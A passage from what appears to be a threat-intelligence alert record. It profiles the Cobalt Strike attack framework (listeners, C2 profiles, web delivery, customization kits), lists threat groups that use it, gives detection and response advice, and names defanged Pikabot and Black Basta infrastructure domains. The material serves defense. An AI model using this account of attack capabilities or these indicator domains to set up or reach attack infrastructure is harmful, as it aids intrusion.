within it. This will determine how an infected host will reach out to the C2 server to retrieve additional payloads and instructions. When creating a listener, the user can configure the payload type, name, C2 server and port, and other various options such as named pipes or proxy servers. \n\nUsers can choose from: \n\n* Beacon DNS\n* Beacon HTTP\n* Beacon HTTPS\n* Beacon SMB\n* Beacon TCP\n* External C2\n* Foreign HTTP\n* Foreign HTTPS\n\nPotentially the most powerful aspect of Cobalt Strike is the array of malleable C2 profiles, which allows users to configure how attacks are created, obfuscate and manage the flow of execution at a very low level.There are several ways to visualize how an adversary interacts with infected Cobalt Strike hosts, such as a session table, pivot graph, or a target table.\n\n![](https://app.sekoia.io/api/v2/inthreat/images/cc77e1ef9a2303f6d174356740c3b58035b8135c3af26ee3b2e78fe92c5894ef.png)\nFigure: Cobalt Strike Listener console\n\n![](https://app.sekoia.io/api/v2/inthreat/images/2fdff8807c594da834ec79ef89a37164ae80de6e9b937d6d37e8b0733dce3299.png)\nFigure: Cobalt Strike session table\n\n\n\n# Web Management: \n\nCobalt Strike delivers exploits and/or malicious payloads using an attacker-controlled web server. The web server can be configured to perform the following actions:\n\n* Host files\n* Clone an existing website to trick users\n* Scripted web delivery\n* Signed Applet Attack (Java)\n* Smart Applet Attack (Java)\n* System profiling\n\nWhen a victim reaches out to the Cobalt Strike web server, it’s logged for operators.\n\n# Customization: \n\nAlmot every feature is customizable through different mechanisms:\n\n* Arsenal Kits:\n\t* [Artificat Kit](https://www.cobaltstrike.com/help-artifact-kit): to modify Windows binaries templates\n\t* [Elevate Kit](https://www.cobaltstrike.com/help-elevate): to integrate privilege exploits\n\t* [Resource Kit](https://www.cobaltstrike.com/help-resource-kit): modify script payload (e.g. powershell)\n* [Malleable Profile](https://www.cobaltstrike.com/help-malleable-c2): modify C2 server and beacon behavior \n* [Aggressor Scripts](https://www.cobaltstrike.com/help-scripting): scripting language allowing multiple action on the client interface\n* [Beacon Object Files (BOFs)](https://www.cobaltstrike.com/help-beacon-object-files): extend post-exploitation functionnality\n\n\n\n# Intrusion Sets that use Cobalt Strike: \n\nIn 2020 Q3, Cobalt Strike was leveraged in more than 66% of performed attacks. It is used by cybercriminals groups as well as State-nexus intrusion sets, including :\n\n* APT19\n* APT29\n* Leviathan\n* CopyKittens\n* APT32\n* UNC2452\n* APT41\n* Chimera\n* DarkHydrus\n* Cobalt Group\n* FIN6\n* Wizard Spider\n\n\n\n# Course of action: \n\n* Cobalt Strike can be dropped in victims systems following phishing campaigns leveraging VBS scripts. It is recommended to disable document macro in MS office. Training users to notice malicous emails should also be performed on a regular basis. \n\n* Cobalt Strike payload can be delivered as a powershell script. It is recommended to restrict powershell script execution to allow signed scripts only.\n\n* Some Cobalt Strike payload signatures can be identified by antivirus. It is recommended to have a good antivirus product.\n\n* Cobalt strike beacons generate abnormal behaviors that can be hunted using Sysmon, Security, PowerShell and WMI logs: \n\t* It is recommended to hunt for parent processes spawning unexpected child processes.\n\t* Hunt for processes behaving abnormally. ex: rundll32.exe establishing a network connection without any command line arguments. \n\t* Monitor suspicious modifications to registry keys, startup folders, task scheduler and service execution.\n\t* Hunt for Anonymous and named pipes known to be specific to Cobalt Strike beacons communication.\n\n* If you have been infected by Cobalt Strike, it is recommended to carry out memory forensics. The tool [CobaltStrikeScan](https://github.com/Apr4h/CobaltStrikeScan) available on github scan for files and process memory for Cobalt Strike beacons and parse their configuration. It scans Windows process memory for evidence of DLL injection.\n\n\n"
                    }
                ],
                "adversaries": [
                    {
                        "id": "infrastructure--6e197bcf-f33a-43cc-a5eb-11d6686ab797",
                        "type": "infrastructure",
                        "name": "Infrastructure used to deliver Pikabot and host cobalt strike linked to Black Basta group",
                        "description": "This infrastructure is used to deliver Pikabot and host Cobalt Strike C2 servers linked to Black Basta ransomware group.\n\nSekoia.io analysts track this cluster based on a combo of:\n* Registrar, ASN, TTL, TLD and ns;\n* Registrar, email, DNS NS records and TTLS.\n\n1. The Cobalt Strike servers can beacon with HTTP or DNS. Example of such domains:\n\t* `modernbeem[.]net` (DNS)\n\t* `thenewbees[.]org` (DNS)\n\t* `erihudeg[.]com` (HTTP)\n2. The PikaBot delivery servers are providing URLs to download PikaBot. Example of such domains:\n\t* `unitedtechform[.]com`\n\t* `trenierad[.]com`\n\t* `kitronits[.]com`\n\t* `ionister[.]com`"
                    }
                ],
                "stix": {},
                "kill_chain_short_id": "KCDbEkmkMciY",
                "first_seen_at": "2024-10-30T16:06:24.782694Z",
                "last_seen_at": "2024-10-30T16:06:24.782694Z",
                "assets": [
                    "85dbcf0f-cc30-421e-8dc0-9088f336fe2c"
                ],
                "time_to_detect": 4,
                "time_to_acknowledge": None,
                "time_to_respond": None,
                "time_to_resolve": None,
                "intake_uuids": [
                    "834a2d7f-3623-4b26-9f9e-c8b6e1efcc16"
                ]
            }
        ]
    }   
